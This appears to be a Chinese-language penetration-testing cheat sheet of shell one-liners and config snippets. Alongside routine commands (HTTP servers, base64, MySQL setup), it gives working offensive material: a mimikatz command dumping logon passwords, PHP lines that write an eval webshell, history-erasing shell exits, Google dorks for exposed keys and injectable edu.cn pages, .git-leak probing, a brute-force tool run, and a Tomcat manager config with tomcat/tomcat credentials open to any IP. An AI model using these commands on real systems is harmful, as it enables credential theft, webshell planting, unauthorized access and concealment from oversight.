### 从文件中提起出网址
```
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

![image-20200908083337439](index.assets/image-20200908083337439.png)

### 批量检测`.git`泄露

```
cat domains.txt | sed 's#$#/.git/HEAD#g' | while read host do ; do echo -en "$host --> " ;curl -I -m 10 -o /dev/null -s -w %{http_code} $host;e
cho ;done;
```

```
localhost:~# cat domains.txt
http://10.7.10.112:81
http://10.7.10.112:81
http://10.7.10.112:81
http://10.7.10.112:81
http://10.7.10.112:81
http://10.7.10.112:81
http://10.7.10.112:81
http://10.7.10.112:81
http://10.7.10.112:81
```

```
localhost:~# cat domains.txt | sed 's#$#/.git/HEAD#g' | while read host do ; do echo -en "$host --> " ;curl -I -m 10 -o /dev/null -s -w %{http_code} $host;e
cho ;done;
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
http://10.7.10.112:81/.git/HEAD --> 200
```

- -I 仅测试HTTP头
- -m 10 最多查询10s
- -o /dev/null 屏蔽原有输出信息
- -s silent 模式，不输出任何东西
- -w %{http_code} 控制额外输出

### 退出shell，但是不保存历史记录

```
kill -9 $$
unset HISTFILE && exit
```

### 条件语句判断

```
true && echo success
false || echo failed
```

### 静态http服务器

```
busybox httpd -p $PORT -h $HOME [-c httpd.conf]
```

### Python开启HTTP服务

```
# Python 3.x
python3 -m http.server 8000 --bind 127.0.0.1

# Python 2.x
python -m SimpleHTTPServer 8000
```



### Python编码解码Base64

```
python -m base64 -e <<< "sample string"   编码
python -m base64 -d <<< "dGhpcyBpcyBlbmNvZGVkCg=="   解码
```

### Google Hack 查找敏感信息

```
intitle:"Everything"  intext:"上一目录"
```

### Linux 开机启动

```
systemctl enable ssh
```

### 使用Nmap扫描端口后，对开放的端口进行密码爆破

```
kali@kali:~/tools/t14m4t$ ./t14m4t  192.168.3.1 10

__  ____   _____             _____   __
_/  |/_   | /  |  |  _____    /  |  |_/  |_
\   __\   |/   |  |_/     \  /   |  |\   __\
 |  | |   /    ^   /  Y Y  \/    ^   /|  |
 |__| |___\____   ||__|_|  /\____   | |__|
      by: n1x_ |__|MS-WEB\/      |__|
       The Automatic Bruteforce Tool

[*] Target: 192.168.3.1 Number of threads: 10.
[*] Starting agressive scan of supported ports against: 192.168.3.1...

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 22:06 EDT
Initiating Parallel DNS resolution of 1 host. at 22:06
Completed Parallel DNS resolution of 1 host. at 22:06, 0.01s elapsed
Initiating Connect Scan at 22:06
Scanning 192.168.3.1 [26 ports]
```

### 抓取Google URL

```
for ((i=1;i<=10;i++));do curl -i -s -k -L -X GET -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0" "https://www.google.com/search?sourceid=chrome-psyapi2&ion=1&espv=2&ie=UTF-8&start=${i}0&q=site:edu.cn%20.php?id=" | grep -Eo 'href="[^\"]+"' | grep -Po "(http|https)://[a-zA-Z0-9./?=_%:-]*" | grep ".php?id" | sort -u ;done
```

### Google Hack 找Tomcat
```
intext:"$CATALINA_HOME/webapps/ROOT/"  intitle:"Apache Tomcat"
```

### Google Hack 找 微信私钥

```
filetype:log  api.weixin
```



### Docker 安装 AWVS

```
#  pull 拉取下载镜像
docker pull secfa/docker-awvs

#  将Docker的3443端口映射到物理机的 13443端口
docker run -it -d -p 13443:3443 secfa/docker-awvs

# 容器的相关信息
awvs13 username: admin@admin.com
awvs13 password: Admin123
AWVS版本：13.0.200217097
```

### Tomcat 部署修改manager配置弱口令

> conf/tomcat-users.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>
</tomcat-users>
```

> webapps\manager\META-INF\context.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Context antiResourceLocking="false" privileged="true" >
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1|\d+\.\d+\.\d+\.\d+" />
  <Manager sessionAttributeValueClassNameFilter="java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap"/>
</Context>

```

### 非交互式获取密码

```
mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full""  exit >> shash.txt
```

### 写入一句话木马

```
fputs(fopen('C:/phpStudy/www/222.php','w'),'<?php eval($_POST["cmd"];)?>');

file_put_contents('C:/phpStudy/WWW/222.php','<?php eval($_POST["cmd"];)?>');
```

### 邮箱->手机号码

```
https://www.jd.com 京东
https://www.taobao.com/ 淘宝
https://www.alipay.com/ 支付宝
https://weibo.com/ 微博
https://secure.www.apple.com.cn/ APPLE
https://www.ctrip.com/ 携程
```

### Arch install Mysql

```
# 安装数据库
sudo pacmain -S mysql

# 初始化数据库
sudo mysql_install_db --user=mysql --ldata=/var/lib/mysql

# 修改用户密码
SET PASSWORD FOR 'root'@'%' = PASSWORD('123456');

# 修改远程登录
REName user 'root'@'localhost' to 'root'@'%';
```

